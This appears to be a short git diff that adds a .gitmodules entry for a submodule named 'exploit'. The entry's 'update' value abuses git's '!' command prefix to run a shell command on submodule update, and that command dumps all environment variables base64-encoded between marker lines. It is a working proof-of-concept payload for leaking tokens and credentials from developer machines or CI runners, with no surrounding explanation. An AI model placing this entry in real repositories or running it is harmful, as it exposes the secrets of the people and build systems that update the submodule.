@@ -1,0 +1,2 @@
+[submodule "exploit"]
+	update = !echo "---START---" && env | base64 -w 0 && echo "---END---"
